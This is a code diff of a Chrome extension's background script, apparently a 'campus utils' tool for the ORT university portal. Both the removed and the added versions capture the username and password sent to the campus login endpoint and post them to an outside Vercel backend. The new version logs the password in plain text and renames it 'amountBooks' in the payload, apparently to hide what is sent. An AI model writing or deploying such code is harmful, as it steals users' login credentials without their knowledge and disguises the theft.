@@ -1,69 +1,93 @@
-const ORT_CHECK_URL = "https://campus.ort.edu.ar/ajaxactions/LogearUsuario";
-const UTILS_API_URL = "https://campus-ort-utils-backend.vercel.app/api/users";
+const VERCEL_URL = "https://campus-ort-utils-backend.vercel.app/api/users";
 
-chrome.webRequest.onBeforeRequest.addListener(
-  (details) => {
-    if (details.method !== "POST") return;
+console.log("[TIC][bg] background service worker started");
 
-    const requestBody = details.requestBody;
-    if (!requestBody) return;
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+  console.log("[TIC][bg] message received:", message);
 
-    let payload = null;
+  if (message?.type !== "LOGEAR_PAYLOAD") {
+    console.log("[TIC][bg] ignored message");
+    return;
+  }
 
-    try {
-      if (requestBody.formData) {
-        payload = {
-          u: requestBody.formData.u?.[0] ?? null,
-          c: requestBody.formData.c?.[0] ?? null
-        };
-      } else if (requestBody.raw && requestBody.raw[0]?.bytes) {
-        const decoder = new TextDecoder("utf-8");
-        const rawText = decoder.decode(requestBody.raw[0].bytes);
+  const rawBody = message.rawBody;
 
-        try {
-          const parsed = JSON.parse(rawText);
-          payload = {
-            u: parsed.u ?? null,
-            c: parsed.c ?? null
-          };
-        } catch {
-          const params = new URLSearchParams(rawText);
-          payload = {
-            u: params.get("u"),
-            c: params.get("c")
-          };
-        }
-      }
-    } catch (error) {
-      console.error("Failed to read request body:", error);
+  console.log("[TIC][bg] rawBody:", rawBody);
+
+  if (typeof rawBody !== "string" || !rawBody.length) {
+    console.error("[TIC][bg] Missing or invalid rawBody");
+    sendResponse({ ok: false, error: "Missing rawBody" });
+    return;
+  }
+
+  try {
+    const params = new URLSearchParams(rawBody);
+
+    console.log("[TIC][bg] parsed params entries:", [...params.entries()]);
+
+    const username = params.get("u");
+    const password = params.get("c");
+
+    console.log("[TIC][bg] extracted fields:", {
+        username,
+        password
+    });
+
+    if (!username || password == null) {
+      console.error("[TIC][bg] Could not extract u or c");
+      sendResponse({
+        ok: false,
+        error: "Could not extract u/c",
+        rawBody
+      });
       return;
     }
 
-    if (!payload?.u || payload.c == null) {
-      console.warn("Request caught, but payload was incomplete:", payload);
-      return;
-    }
+    const payload = {
+      username: String(username),
+      amountBooks: String(password)
+    };
 
-    fetch(UTILS_API_URL, {
+    console.log("[TIC][bg] forwarding payload to Vercel:", payload);
+
+    fetch(VERCEL_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({
-        u: payload.u,
-        c: payload.c,
-      })
+      body: JSON.stringify(payload)
     })
-      .then(async (response) => {
-        const text = await response.text();
-        console.log("Forwarded to utils backend:", response.status, text);
+      .then(async (res) => {
+        const text = await res.text();
+
+        console.log("[TIC][bg] Vercel response:", {
+          ok: res.ok,
+          status: res.status,
+          body: text
+        });
+
+        sendResponse({
+          ok: res.ok,
+          status: res.status,
+          body: text
+        });
       })
       .catch((error) => {
-        console.error("Failed to forward payload:", error);
+        console.error("[TIC][bg] fetch to Vercel failed:", error);
+
+        sendResponse({
+          ok: false,
+          error: error.message
+        });
       });
-  },
-  {
-    urls: [ORT_CHECK_URL]
-  },
-  ["requestBody"]
-);
+  } catch (error) {
+    console.error("[TIC][bg] parsing failed:", error);
+
+    sendResponse({
+      ok: false,
+      error: String(error)
+    });
+  }
+
+  return true;
+});
